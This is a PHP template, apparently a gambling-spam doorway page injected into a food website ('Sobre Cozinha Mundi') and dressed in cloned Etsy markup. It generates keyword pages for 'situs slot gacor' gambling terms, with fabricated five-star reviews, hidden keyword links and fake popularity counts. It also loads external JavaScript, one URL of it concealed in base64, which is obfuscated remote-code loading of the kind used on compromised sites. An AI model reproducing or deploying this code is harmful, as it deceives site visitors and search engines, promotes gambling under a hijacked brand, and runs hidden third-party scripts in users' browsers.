...
////////// S30 KDB0NG ANTI CURI CURI SCRIPT //////////

function loadFile($filename) {
    if (file_exists($filename)) {
        return file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    } else {
        error_log("File " . basename($filename) . " tidak ditemukan.");
...
$id_ID = filter_input(INPUT_GET, 'id_ID', FILTER_SANITIZE_STRING);
if (!$id_ID) {
    // 
...
$target_string = strtolower(trim($id_ID));

//////////[-KDB-]//////////[-KDB-]////////[-KDB-]//////////

$filename = __DIR__ . "/wp/K.txt";
$titlesFile = __DIR__ . "/wp/T.txt";
$descriptions5File = __DIR__ . "/wp/RATE.txt";
$descriptions6File = __DIR__ . "/wp/D4.txt";

//////////[-KDB-]//////////[-KDB-]////////[-KDB-]//////////

$lines = loadFile($filename);
$index = array_search($target_string, array_map('strtolower', array_map('trim', $lines)));
...
$descriptions5 = loadFile($descriptions5File);
$descriptions6 = loadFile($descriptions6File);
$titles = loadFile($titlesFile);

//////////[-KDB-]//////////[-KDB-]////////[-KDB-]//////////

if (!isset($descriptions5[$index], $descriptions6[$index],  $titles[$index])) {
    header("HTTP/1.0 404 Not Found");
    exit;
}
...
$description5 = htmlspecialchars($descriptions5[$index]);
$description6 = htmlspecialchars($descriptions6[$index]);
$title = htmlspecialchars($titles[$index]);

//////////[-KDB-]//////////[-KDB-]////////[-KDB-]//////////

$base_url = "https://cozinhamundi.com/sobre/";
$url = $base_url . rawurlencode($id_ID) . "/";

//////////[-KDB-]//////////[-KDB-]////////[-KDB-]//////////

$ampURL       = "https://softnavigations.pages.dev/cozinhamundi";
$image        = "https://ik.imagekit.io/xk3y3qlh2/img/mahjong27.png";
$imageicon    = "https://cdn.prod.website-files.com/624c3925bc764d6b7ec962cb/6290daf6158d301a9c742345_icon-original-256-256.png";

$name1 = "Jamal Pratama";
$review1 = "tentang Cozinha Mundi, media kuliner yang mengangkat seni memasak, pengetahuan dapur, dan perspektif gastronomi global dengan pendekatan profesional.";
$date1 = "2025-10-10";

$name2 = "Ridu Cahaya";
$review2 = "sebagai Cozinha Mundi menghadirkan konten kuliner berkualitas tentang resep, teknik memasak, dan budaya makanan untuk pembaca yang menghargai detail dan rasa.";
$date2 = "2024-07-20";

$name3 = "Rio Bundiono";
$review3 = "di Sobre Cozinha Mundi membahas visi, nilai, dan fokus konten kuliner yang mengedepankan kualitas, eksplorasi rasa, dan pengetahuan dapur.";
$date3 = "2026-01-25";
...
<head>
    ...
    <meta charset="utf-8">
    <title><?php echo $title; ?> - Sobre Cozinha Mundi</title>
    <link rel="amphtml" href="<?= $ampURL; ?>">
    <link rel="canonical" href="<?php echo $url; ?>"/>
    <meta name="description"
        content="<?php echo $title; ?> mengenal Cozinha Mundi lebih dekat sebagai platform kuliner yang menyajikan wawasan dapur, resep terkurasi, dan eksplorasi cita rasa dunia.">
    ...
    <meta property="og:title"
        content="<?php echo $title; ?> - Sobre Cozinha Mundi" />
    ...
    <link rel="shortcut icon" href="<?= $imageicon; ?>" />
    <link rel="icon" href="<?= $imageicon; ?>" type="image/png" sizes="32x32" />
    <link rel="icon" href="<?= $imageicon; ?>" type="image/png" sizes="16x16" />
    <link rel="apple-touch-icon" href="<?= $imageicon; ?>" sizes="180x180" />
    <link rel="mask-icon" href="<?= $imageicon; ?>" color="rgb(241, 100, 30)" />
    ...
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-FI" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-AU" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-CA" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-DK" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-HK" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-IE" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-IL" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-IN" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-NZ" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-NO" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-SE" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-SG" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="en-GB" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="de" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="de-AT" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="de-CH" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="fr" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="fr-CA" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="nl" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="nl-BE" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="it" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="es" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="es-MX" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="ja" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="pl" />
    <link rel="alternate" href="<?php echo $url; ?>" hreflang="pt" />
    ...
    <script type="application/ld+json">
{
  ...
  "@type": "Product",
  "@id": "<?php echo $url; ?>#situs-gacor-product",
  "url": "<?php echo $url; ?>",
  "name": "<?php echo $title; ?> - Sobre Cozinha Mundi",
  "description": "<?php echo $title; ?> mengenal Cozinha Mundi lebih dekat sebagai platform kuliner yang menyajikan wawasan dapur, resep terkurasi, dan eksplorasi cita rasa dunia.",
  "image": {
    "@type": "ImageObject",
    "url": "<?= $image; ?>"
  },
  ...
  "review": [
    {
      "@type": "Review",
      "datePublished": "<?= htmlspecialchars($date1); ?>",
      "reviewBody": "<?php echo $title; ?> <?= htmlspecialchars($review1); ?>",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": "5",
        "bestRating": "5"
    ...
    {
      "@type": "Review",
      "datePublished": "<?= htmlspecialchars($date2); ?>",
      "reviewBody": "<?php echo $title; ?> <?= htmlspecialchars($review2); ?>",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": "5",
        "bestRating": "5"
    ...
    {
      "@type": "Review",
      "datePublished": "<?= htmlspecialchars($date3); ?>",
      "reviewBody": "<?php echo $title; ?> <?= htmlspecialchars($review3); ?>",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": "5",
        "bestRating": "5"
...
<script type="application/ld+json">
{
  ...
  "itemListElement": [
    ...
    },
    {
      "@type": "ListItem",
      "position": 2,
      "name": "Slot Gacor Online Terbaru",
      "item": "<?php echo $url; ?>"
    },
    {
      "@type": "ListItem",
      "position": 3,
      "name": "Gampang Maxwin Hari Ini",
      "item": "<?php echo $url; ?>"
    }
  ]
}
...
<script>
  (function () {
    ...
    s.src = `https://cdn.jsdelivr.net/gh/rdtz/cdn-globaljs@main/docs/fileup/elsaborcallejero.js?v=${ts}`;
    s.defer = true;
...
<script>
    function loadEncodedScript( ) {
      var encodedUrl = 'aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2tkYm9ucy9pbnNpZ2h0QG1haW4vc2NyaXB0L2pxdWVyeS9ldHN5Lmpz';
    ...
    <div data-selector="header-cat-nav-wrapper" data-menu-ui="menubar">
        ...
        wt-mb-lg-0">
                    ...
                    " placeholder="SITUS SLOT GACOR LINK <?php echo $title; ?> !!" value=""
                                ...
                                <div data-clg-id="WtMenu"
                                    ...
                                    <div data-clg-id="WtMenuBody" role="menu"
                                        ...
                                        <ul class="wt-list-unstyled">
                                            ...
                                            <li class="wt-sem-text-primary wt-list-unstyled">
                                                <a role="menuitem" href="<?php echo $url; ?>"
          ...
          wt-display-none" aria-hidden="true" data-notification="you-menu">
                            ...
                            <li data-ge-nav-menu="cart" data-ge-hover-event-name="gnav_hover_cart_menu">
                                <span class="wt-tooltip wt-tooltip--bottom-left wt-tooltip--disabled-touch"
                                    ...
                                    <a aria-label="Basket with 0 items" href="<?php echo $url; ?>"
...
/* Gradient PURPLE ROYAL + metal vibe */
.login,
.register {
...
/* Hover – naik + glow PURPLE GILA */
.login:hover,
.register:hover {
  transform: translateY(-10px);
  box-shadow: 
    0 20px 0 #1a0033,
    0 35px 60px rgba(168,85,247,0.95),
    0 0 40px rgba(147,51,234,0.9),
    0 0 70px rgba(88,28,135,0.8);
}
  ...
  <a href="<?= $ampURL; ?>"
                            ...
                            <ul class="wt-list-unstyled wt-grid__item-xs-12 wt-body-max-width wt-display-flex-xs wt-justify-content-center"
                                ...
                                <li data-ui="list-item-breadcrumbs"
                                    ...
                                    <a data-breadcrumb-link data-menu-ui="menuitem" tabindex="0"
                                        href="<?php echo $url; ?>">SITUS SLOT GACOR</a>
                                    <span
        ...
        {"listingId":4302118744,"isFavorite":false,"listingImgUrl":"https:\/\/i.etsystatic.com\/54267703\/r\/il\/f18987\/6256816164\/il_75x75.6256816164_26ap.jpg","source":"lp_image_carousel","ignoreMenuCookie":"ignore_mini_collections_menu_cookie","isCollected":false}
                ...
                show-scrollable-thumbnails">
                                                    ...
                                                    <ul class="wt-list-unstyled wt-overflow-hidden wt-position-relative carousel-pane-list"
                                                        style="padding-top: 100%;" data-carousel-pane-list tabindex="0">
                                                        <li class=" wt-position-absolute wt-width-full wt-height-full wt-position-top wt-position-left carousel-pane"
                                                            data-carousel-pane data-index="0" data-image-id="6256816164"
                                                            data-palette-listing-image>
                                                            <img class="wt-max-width-full wt-horizontal-center wt-vertical-center carousel-image wt-rounded"
                                                                alt="<?php echo $title; ?>" data-carousel-first-image
                                                    ...
                                                    <div class="wt-display-flex-xs wt-justify-content-center wt-height-full image-overlay-main-image-container"
                                                        ...
                                                        <div data-overlay-main-image-container
                                                            ...
                                                            <ul class="wt-list-unstyled wt-overflow-hidden image-overlay-list wt-position-relative wt-vertical-center wt-display-flex-xs wt-justify-content-center"
                                                                style="padding-top: 100%;" data-image-overlay-list
                                                                tabindex="0">
                                    ...
                                    <div id="listing-page-cart"
                                        ...
                                        <div class="wt-mb-xs-1 wt-mt-xs-1">
                                            <div data-appears-component-name="Etsy-Modules-ListingPage-UrgencySignal-RecsRankingApiSpec"
                                                ...
                                                <p class="wt-text-title-01 wt-sem-text-critical ">Disukai ! 108.205.117
                                                </p>
                                            </div>
                                        </div>
                                        <div class="wt-display-flex-xs wt-align-items-center">
            ...
            ">
                                        ...
                                        <div class="wt-mt-xs-1 wt-mb-xs-1">
                                            <h1><?php echo $title; ?> - Sobre Cozinha Mundi</h1>
                                            <p style="text-align: justify;" data-buy-box-listing-title="true"
                                                tabindex="0" class="wt-line-height-tight wt-break-word wt-text-body">
                                                <?php echo $title; ?> mengenal Cozinha Mundi lebih dekat sebagai platform kuliner yang menyajikan wawasan dapur, resep terkurasi, dan eksplorasi cita rasa dunia.</p>
                                        </div>
    ...
    ">
                                            ...
                                            <div data-buy-box>
                                                ...
                                                <div
                                                    ...
                                                    <div class="wt-flex-xs-1 wt-mr-lg-0"
                                                        ...
                                                        <form action="/cart/listing/4302118744" method="post" class="add-to-cart-form checkout-single-listing-form
            ">
                                                            <input type="hidden" name="_nnc"
         ...
         <div style="display:none">
             ...
             <a href="<?php echo $url; ?>"><?php echo $title; ?> daftar</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> link</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> alternatif</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> login</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> live chat</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> gacor</a>
             <a href="<?php echo $url; ?>">situs <?php echo $title; ?></a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> slot</a>
             <a href="<?php echo $url; ?>"><?php echo $title; ?> rtp</a>
         </div>    
    ...
    <div class="wt-body-max-width wt-mb-xs-6 wt-pr-xs-2 wt-pl-xs-2 wt-pl-md-4 wt-pr-md-4 wt-pl-lg-5 wt-pr-lg-5">
            ...
            <div class="wt-display-flex-xs wt-align-items-center wt-flex-direction-row-lg wt-flex-direction-column-xs">
                ...
                <div class="wt-text-caption">
                    <a rel="nofollow" class="wt-text-link"
                        href="/listing/4302118744/book-club-print-bookish-poster-trendy/favoriters?ref=l2-collection-count">
                        108.205.117 Sangat Puas !
                    </a>
                </div>
            </div>
        ...
        <div class="wt-text-caption wt-text-center-xs wt-text-left-lg">
            <a href="<?php echo $url; ?>">SITUS SLOT GACOR</a>
                            ...
                            <div
                                ...
                                <div class="wt-mb-xs-5 wt-mb-md-0">
                                    ...
                                    <p class="wt-text-body-01 wt-max-width-sm wt-ml-xs-0">
                                        ...
                                        places.
                                        <a href="<?php echo $url; ?>" target="_blank">View Etsy’s
                                            Privacy Policy</a>
                                    </p>
                                </div>
                                <div>
            ...
            <div data-appears-component-name="impact_message"
                ...
                <div class="footer-impact-callout wt-position-relative">
                    <div class="wt-bg-denim-light wt-sem-text-on-surface-dark wt-text-center-xs wt-text-body-01 wt-pb-xs-4 wt-pt-xs-4"
                        style="background-image: linear-gradient(to top, #ad76e9 0%, #7e19e4 18%, #9333ea 38%, #6b21a8 60%, #3b0764 100%);">
                    ...
                    <div class="wt-select wt-text-body-01">
                        <select id="locale-overlay-select-region_code" name="region_code" class="wt-select__element">
                            ...
                            <optgroup label="&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;">
                                ...
                                <option value="MD" >Moltaflay</option>
                            ...
                            <div class="wt-flex-xl-5 wt-flex-lg-5 wt-flex-md-5 wt-flex-sm-5 wt-flex-xs-5">
                                ...
                                <p class="wt-text-caption wt-mb-xs-2"> Personalised advertising may be considered a
                                    ...
                                    to exercise your right to opt out. Learn more in our <a class="wt-text-link"
                                        href="<?php echo $url; ?>">Privacy Policy</a>, <a
                                        class="wt-text-link"
                                        ...
                                        href="<?php echo $url; ?>">Cookies & Similar Technologies
                                        Policy</a>.</p>
                            </div>
                            <div class="wt-flex-xl-1 wt-flex-lg-1 wt-flex-md-1 wt-flex-sm-1 wt-flex-xs-1">
                                <div
    ...
    <script defer
        ...
        crossorigin="anonymous" type="4e1bd56d3cb08382ff2b5995-text/javascript"></script>
    <script defer
        src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
        integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
    ...
    <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js"
        data-cf-settings="4e1bd56d3cb08382ff2b5995-|49" defer></script>
    ...
    <script defer
        ...
        data-cf-beacon='{"version":"2024.11.0","token":"41abd9ec60a0400a9fd933bf59bc84b2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
        crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"dc246642aab34630b6ab14fcf457b51c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f83c2f91bc524cb9a39d49b5eed2accd","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl504978'},{'dcenter':'p3'},{'cp_id':'10040197'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
</div>
